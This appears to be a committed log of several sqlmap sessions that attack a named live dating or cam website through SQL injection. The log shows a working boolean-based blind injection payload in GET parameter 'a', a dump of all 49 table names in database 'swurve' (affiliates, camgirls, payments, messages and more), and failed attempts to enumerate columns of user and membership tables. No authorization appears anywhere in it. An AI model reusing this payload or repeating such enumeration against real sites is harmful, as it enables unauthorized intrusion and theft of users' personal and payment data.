@@ -1,0 +1,244 @@
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-8d1e1ea}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 18:14:12
+
+[18:14:12] [INFO] resuming back-end DBMS 'mysql' 
+[18:14:12] [INFO] testing connection to the target URL
+[18:14:13] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: a=(SELECT (CASE WHEN (9466=9466) THEN 9466 ELSE 9466*(SELECT 9466 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+---
+[18:14:13] [INFO] the back-end DBMS is MySQL
+web application technology: Apache
+back-end DBMS: MySQL 5.0
+[18:14:13] [INFO] fetching tables for database: 'swurve'
+[18:14:13] [INFO] fetching number of tables for database 'swurve'
+[18:14:13] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[18:14:13] [INFO] retrieved: 49
+[18:14:16] [INFO] retrieved: adminlog
+[18:14:39] [INFO] retrieved: affiliate_bannerads
+[18:15:28] [INFO] retrieved: affiliate_bannerads_categories
+[18:16:06] [INFO] retrieved: affiliate_campaigns
+[18:16:41] [INFO] retrieved: affiliate_categories
+[18:17:09] [INFO] retrieved: affiliate_payments
+[18:17:42] [INFO] retrieved: affiliate_payouts
+[18:18:01] [INFO] retrieved: affiliate_stats
+[18:18:20] [INFO] retrieved: affiliate_subs
+[18:18:35] [INFO] retrieved: affiliates
+[18:18:44] [INFO] retrieved: blocks
+[18:19:02] [INFO] retrieved: camgirl_payments
+[18:19:45] [INFO] retrieved: camgirls
+[18:19:53] [INFO] retrieved: chat_tracker
+[18:20:25] [INFO] retrieved: chats
+[18:20:32] [INFO] retrieved: cities
+[18:20:47] [INFO] retrieved: contact_types
+[18:21:22] [INFO] retrieved: contacts
+[18:21:30] [INFO] retrieved: countries
+[18:21:51] [INFO] retrieved: feed_types
+[18:22:19] [INFO] retrieved: feeds
+[18:22:25] [INFO] retrieved: filters
+[18:22:44] [INFO] retrieved: geoads
+[18:23:01] [INFO] retrieved: iplocationdb_country
+[18:23:55] [INFO] retrieved: iplocationdb_ip
+[18:24:09] [INFO] retrieved: iplocationdb_isp
+[18:24:23] [INFO] retrieved: iplocationdb_location
+[18:24:52] [INFO] retrieved: iplocationdb_organization
+[18:25:31] [INFO] retrieved: iplocationdb_region
+[18:25:54] [INFO] retrieved: logs
+[18:26:07] [INFO] retrieved: memberships
+[18:26:37] [INFO] retrieved: message_types
+[18:27:08] [INFO] retrieved: messages
+[18:27:16] [INFO] retrieved: news
+[18:27:29] [INFO] retrieved: online
+[18:27:46] [INFO] retrieved: photos
+[18:28:05] [INFO] retrieved: promo
+[18:28:18] [INFO] retrieved: ratings
+[18:28:38] [INFO] retrieved: regions
+[18:28:56] [INFO] retrieved: relationship_types
+[18:29:41] [INFO] retrieved: relationship_types_users
+[18:30:12] [INFO] retrieved: stat_types
+[18:30:40] [INFO] retrieved: templates
+[18:31:06] [INFO] retrieved: transactions
+[18:31:41] [INFO] retrieved: unread 
+[18:32:52] [INFO] retrieved: unread\x04
+[18:33:50] [INFO] retrieved: unread\\x04
+[18:34:48] [INFO] retrieved: unread\\\\x04
+[18:35:47] [INFO] retrieved: unread\\\\\\\\x04
+Database: swurve
+[49 tables]
++--------------------------------+
+| unread\\\\\\\\\\\\\\\\x04      |
+| unread\\\\\\\\x04              |
+| unread\\\\x04                  |
+| unread\\x04                    |
+| unread\x04                     |
+| adminlog                       |
+| affiliate_bannerads            |
+| affiliate_bannerads_categories |
+| affiliate_campaigns            |
+| affiliate_categories           |
+| affiliate_payments             |
+| affiliate_payouts              |
+| affiliate_stats                |
+| affiliate_subs                 |
+| affiliates                     |
+| blocks                         |
+| camgirl_payments               |
+| camgirls                       |
+| chat_tracker                   |
+| chats                          |
+| cities                         |
+| contact_types                  |
+| contacts                       |
+| countries                      |
+| feed_types                     |
+| feeds                          |
+| filters                        |
+| geoads                         |
+| iplocationdb_country           |
+| iplocationdb_ip                |
+| iplocationdb_isp               |
+| iplocationdb_location          |
+| iplocationdb_organization      |
+| iplocationdb_region            |
+| logs                           |
+| memberships                    |
+| message_types                  |
+| messages                       |
+| news                           |
+| online                         |
+| photos                         |
+| promo                          |
+| ratings                        |
+| regions                        |
+| relationship_types             |
+| relationship_types_users       |
+| stat_types                     |
+| templates                      |
+| transactions                   |
++--------------------------------+
+
+[18:36:48] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 1 times
+[18:36:48] [INFO] fetched data logged to text files under '/home/nitrous/.sqlmap/output/www.russiandesire.com'
+
+[*] shutting down at 18:36:48
+
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-8d1e1ea}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 18:43:32
+
+[18:43:32] [INFO] resuming back-end DBMS 'mysql' 
+[18:43:32] [INFO] testing connection to the target URL
+[18:43:33] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: a=(SELECT (CASE WHEN (9466=9466) THEN 9466 ELSE 9466*(SELECT 9466 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+---
+[18:43:33] [INFO] the back-end DBMS is MySQL
+web application technology: Apache
+back-end DBMS: MySQL 5.0
+[18:43:33] [INFO] fetching columns for table 'User' in database 'swurve'
+[18:43:33] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[18:43:33] [INFO] retrieved: 
+[18:43:34] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[18:43:34] [ERROR] unable to retrieve the number of columns for table 'User' in database 'swurve'
+[18:43:34] [WARNING] unable to retrieve column names for table 'User' in database 'swurve'
+do you want to use common column existence check? [y/N/q] 
+[18:43:55] [ERROR] user quit
+
+[*] shutting down at 18:43:55
+
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-8d1e1ea}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 18:44:01
+
+[18:44:01] [INFO] resuming back-end DBMS 'mysql' 
+[18:44:01] [INFO] testing connection to the target URL
+[18:44:02] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: a=(SELECT (CASE WHEN (9466=9466) THEN 9466 ELSE 9466*(SELECT 9466 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+---
+[18:44:03] [INFO] the back-end DBMS is MySQL
+web application technology: Apache
+back-end DBMS: MySQL 5.0
+[18:44:03] [INFO] fetching columns for table 'Users' in database 'swurve'
+[18:44:03] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[18:44:03] [INFO] retrieved: 
+[18:44:03] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[18:44:03] [ERROR] unable to retrieve the number of columns for table 'Users' in database 'swurve'
+[18:44:03] [WARNING] unable to retrieve column names for table 'Users' in database 'swurve'
+do you want to use common column existence check? [y/N/q] [18:45:02] [INFO] checking column existence using items from '/home/nitrous/sqlmap-dev/txt/common-columns.txt'
+[18:45:02] [INFO] adding words used on web page to the check list
+please enter number of threads? [Enter for 1 (current)] [18:45:13] [WARNING] running in a single-thread mode. This could take a while
+[18:45:14] [INFO] tried 1/2655 items (0%)[18:45:14] [INFO] tried 2/2655 items (0%)[18:45:14] [INFO] tried 3/2655 items (0%)[18:45:14] [INFO] tried 4/2655 items (0%)[18:45:14] [INFO] tried 5/2655 items (0%)[18:45:15] [INFO] tried 6/2655 items (0%)[18:45:15] [INFO] tried 7/2655 items (0%)[18:45:15] [INFO] tried 8/2655 items (0%)[18:45:15] [INFO] tried 9/2655 items (0%)[18:45:15] [INFO] tried 10/2655 items (0%)[18:45:16] [INFO] tried 11/2655 items (0%)[18:45:16] [INFO] tried 12/2655 items (0%)[18:45:16] [INFO] tried 13/2655 items (0%)[18:45:16] [INFO] tried 14/2655 items (1%)[18:45:16] [INFO] tried 15/2655 items (1%)[18:45:16] [INFO] tried 16/2655 items (1%)[18:45:17] [INFO] tried 17/2655 items (1%)[18:45:17] [INFO] tried 18/2655 items (1%)[18:45:17] [INFO] tried 19/2655 items (1%)[18:45:17] [INFO] tried 20/2655 items (1%)[18:45:17] [INFO] tried 21/2655 items (1%)[18:45:18] [INFO] tried 22/2655 items (1%)[18:45:18] [INFO] tried 23/2655 items (1%)[18:45:18] [INFO] tried 24/2655 items (1%)[18:45:18] [INFO] tried 25/2655 items (1%)[18:45:18] [INFO] tried 26/2655 items (1%)[18:45:18] [INFO] tried 27/2655 items (1%)[18:45:19] [INFO] tried 28/2655 items (1%)[18:45:19] [INFO] tried 29/2655 items (1%)[18:45:19] [INFO] tried 30/2655 items (1%)[18:45:19] [INFO] tried 31/2655 items (1%)[18:45:19] [INFO] tried 32/2655 items (1%)[18:45:20] [INFO] tried 33/2655 items (1%)[18:45:20] [INFO] tried 34/2655 items (1%)[18:45:20] [INFO] tried 35/2655 items (1%)[18:45:20] [INFO] tried 36/2655 items (1%)[18:45:20] [INFO] tried 37/2655 items (1%)[18:45:20] [INFO] tried 38/2655 items (1%)[18:45:21] [INFO] tried 39/2655 items (1%)[18:45:21] [INFO] tried 40/2655 items (2%)[18:45:21] [INFO] tried 41/2655 items (2%)[18:45:21] [INFO] tried 42/2655 items (2%)[18:45:21] [INFO] tried 43/2655 items (2%)[18:45:21] [INFO] tried 44/2655 items (2%)[18:45:22] [INFO] tried 45/2655 items (2%)[18:45:22] [INFO] tried 46/2655 items (2%)[18:45:22] [INFO] tried 47/2655 items (2%)[18:45:22] [INFO] tried 48/2655 items (2%)[18:45:22] [INFO] tried 49/2655 items (2%)[18:45:23] [INFO] tried 50/2655 items (2%)[18:45:23] [INFO] tried 51/2655 items (2%)[18:45:23] [INFO] tried 52/2655 items (2%)[18:45:23] [INFO] tried 53/2655 items (2%)[18:45:23] [INFO] tried 54/2655 items (2%)[18:45:24] [INFO] tried 55/2655 items (2%)[18:45:24] [INFO] tried 56/2655 items (2%)[18:45:24] [INFO] tried 57/2655 items (2%)[18:45:24] [INFO] tried 58/2655 items (2%)[18:45:24] [INFO] tried 59/2655 items (2%)[18:45:25] [INFO] tried 60/2655 items (2%)[18:45:25] [INFO] tried 61/2655 items (2%)[18:45:25] [INFO] tried 62/2655 items (2%)[18:45:25] [INFO] tried 63/2655 items (2%)[18:45:25] [INFO] tried 64/2655 items (2%)[18:45:25] [INFO] tried 65/2655 items (2%)[18:45:26] [INFO] tried 66/2655 items (2%)[18:45:26] [INFO] tried 67/2655 items (3%)[18:45:26] [INFO] tried 68/2655 items (3%)[18:45:26] [INFO] tried 69/2655 items (3%)[18:45:26] [INFO] tried 70/2655 items (3%)[18:45:27] [INFO] tried 71/2655 items (3%)[18:45:27] [INFO] tried 72/2655 items (3%)[18:45:27] [INFO] tried 73/2655 items (3%)[18:45:27] [INFO] tried 74/2655 items (3%)[18:45:27] [INFO] tried 75/2655 items (3%)[18:45:28] [INFO] tried 76/2655 items (3%)[18:45:28] [INFO] tried 77/2655 items (3%)[18:45:28] [INFO] tried 78/2655 items (3%)[18:45:28] [INFO] tried 79/2655 items (3%)[18:45:28] [INFO] tried 80/2655 items (3%)[18:45:28] [INFO] tried 81/2655 items (3%)[18:45:29] [INFO] tried 82/2655 items (3%)[18:45:29] [INFO] tried 83/2655 items (3%)[18:45:29] [INFO] tried 84/2655 items (3%)[18:45:29] [INFO] tried 85/2655 items (3%)[18:45:29] [INFO] tried 86/2655 items (3%)[18:45:29] [INFO] tried 87/2655 items (3%)[18:45:30] [INFO] tried 88/2655 items (3%)[18:45:30] [INFO] tried 89/2655 items (3%)[18:45:30] [INFO] tried 90/2655 items (3%)[18:45:30] [INFO] tried 91/2655 items (3%)[18:45:30] [INFO] tried 92/2655 items (3%)[18:45:31] [INFO] tried 93/2655 items (4%)[18:45:31] [INFO] tried 94/2655 items (4%)[18:45:31] [INFO] tried 95/2655 items (4%)[18:45:31] [INFO] tried 96/2655 items (4%)[18:45:31] [INFO] tried 97/2655 items (4%)[18:45:31] [INFO] tried 98/2655 items (4%)[18:45:32] [INFO] tried 99/2655 items (4%)[18:45:32] [INFO] tried 100/2655 items (4%)[18:45:32] [INFO] tried 101/2655 items (4%)[18:45:32] [INFO] tried 102/2655 items (4%)[18:45:32] [INFO] tried 103/2655 items (4%)[18:45:33] [INFO] tried 104/2655 items (4%)[18:45:33] [INFO] tried 105/2655 items (4%)[18:45:33] [INFO] tried 106/2655 items (4%)[18:45:33] [INFO] tried 107/2655 items (4%)[18:45:33] [INFO] tried 108/2655 items (4%)[18:45:33] [INFO] tried 109/2655 items (4%)[18:45:34] [INFO] tried 110/2655 items (4%)[18:45:34] [INFO] tried 111/2655 items (4%)[18:45:34] [INFO] tried 112/2655 items (4%)[18:45:34] [INFO] tried 113/2655 items (4%)[18:45:34] [INFO] tried 114/2655 items (4%)[18:45:35] [INFO] tried 115/2655 items (4%)[18:45:35] [INFO] tried 116/2655 items (4%)[18:45:35] [INFO] tried 117/2655 items (4%)[18:45:35] [INFO] tried 118/2655 items (4%)[18:45:35] [INFO] tried 119/2655 items (4%)[18:45:35] [INFO] tried 120/2655 items (5%)[18:45:36] [INFO] tried 121/2655 items (5%)[18:45:36] [INFO] tried 122/2655 items (5%)[18:45:36] [INFO] tried 123/2655 items (5%)[18:45:36] [INFO] tried 124/2655 items (5%)[18:45:36] [INFO] tried 125/2655 items (5%)[18:45:37] [INFO] tried 126/2655 items (5%)[18:45:37] [INFO] tried 127/2655 items (5%)[18:45:37] [INFO] tried 128/2655 items (5%)[18:45:37] [INFO] tried 129/2655 items (5%)[18:45:37] [INFO] tried 130/2655 items (5%)[18:45:38] [INFO] tried 131/2655 items (5%)[18:45:38] [INFO] tried 132/2655 items (5%)[18:45:38] [INFO] tried 133/2655 items (5%)[18:45:38] [INFO] tried 134/2655 items (5%)[18:45:38] [INFO] tried 135/2655 items (5%)[18:45:38] [INFO] tried 136/2655 items (5%)[18:45:39] [INFO] tried 137/2655 items (5%)[18:45:39] [INFO] tried 138/2655 items (5%)[18:45:39] [INFO] tried 139/2655 items (5%)[18:45:39] [INFO] tried 140/2655 items (5%)[18:45:39] [INFO] tried 141/2655 items (5%)[18:45:40] [INFO] tried 142/2655 items (5%)[18:45:40] [INFO] tried 143/2655 items (5%)[18:45:40] [INFO] tried 144/2655 items (5%)[18:45:40] [INFO] tried 145/2655 items (5%)[18:45:40] [INFO] tried 146/2655 items (5%)[18:45:40] [INFO] tried 147/2655 items (6%)[18:45:41] [INFO] tried 148/2655 items (6%)[18:45:41] [INFO] tried 149/2655 items (6%)[18:45:41] [INFO] tried 150/2655 items (6%)[18:45:41] [INFO] tried 151/2655 items (6%)[18:45:41] [INFO] tried 152/2655 items (6%)[18:45:42] [INFO] tried 153/2655 items (6%)[18:45:42] [INFO] tried 154/2655 items (6%)[18:45:42] [INFO] tried 155/2655 items (6%)[18:45:42] [INFO] tried 156/2655 items (6%)[18:45:42] [INFO] tried 157/2655 items (6%)[18:45:43] [INFO] tried 158/2655 items (6%)[18:45:43] [INFO] tried 159/2655 items (6%)[18:45:43] [INFO] tried 160/2655 items (6%)[18:45:43] [INFO] tried 161/2655 items (6%)[18:45:43] [INFO] tried 162/2655 items (6%)[18:45:43] [INFO] tried 163/2655 items (6%)[18:45:44] [INFO] tried 164/2655 items (6%)[18:45:44] [INFO] tried 165/2655 items (6%)[18:45:44] [INFO] tried 166/2655 items (6%)[18:45:44] [INFO] tried 167/2655 items (6%)[18:45:44] [INFO] tried 168/2655 items (6%)[18:45:45] [INFO] tried 169/2655 items (6%)[18:45:45] [INFO] tried 170/2655 items (6%)[18:45:45] [INFO] tried 171/2655 items (6%)[18:45:45] [INFO] tried 172/2655 items (6%)[18:45:45] [INFO] tried 173/2655 items (7%)[18:45:45] [INFO] tried 174/2655 items (7%)[18:45:46] [INFO] tried 175/2655 items (7%)[18:45:46] [INFO] tried 176/2655 items (7%)[18:45:46] [INFO] tried 177/2655 items (7%)[18:45:46] [INFO] tried 178/2655 items (7%)
+
+[18:45:46] [WARNING] user aborted during column existence check. sqlmap will display partial output
+
+[18:45:46] [WARNING] no column(s) found
+[18:45:46] [INFO] fetched data logged to text files under '/home/nitrous/.sqlmap/output/www.russiandesire.com'
+
+[*] shutting down at 18:45:46
+
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-8d1e1ea}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 18:46:15
+
+[18:46:15] [INFO] resuming back-end DBMS 'mysql' 
+[18:46:15] [INFO] testing connection to the target URL
+[18:46:15] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: a (GET)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: a=(SELECT (CASE WHEN (9466=9466) THEN 9466 ELSE 9466*(SELECT 9466 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
+---
+[18:46:16] [INFO] the back-end DBMS is MySQL
+web application technology: Apache
+back-end DBMS: MySQL 5.0
+[18:46:16] [INFO] fetching columns for table 'memberships' in database 'swurve'
+[18:46:16] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[18:46:16] [INFO] retrieved: 
+[18:46:16] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[18:46:16] [ERROR] unable to retrieve the number of columns for table 'memberships' in database 'swurve'
+[18:46:16] [WARNING] unable to retrieve column names for table 'memberships' in database 'swurve'
+do you want to use common column existence check? [y/N/q] [18:47:09] [ERROR] user quit
+
+[*] shutting down at 18:47:09
+
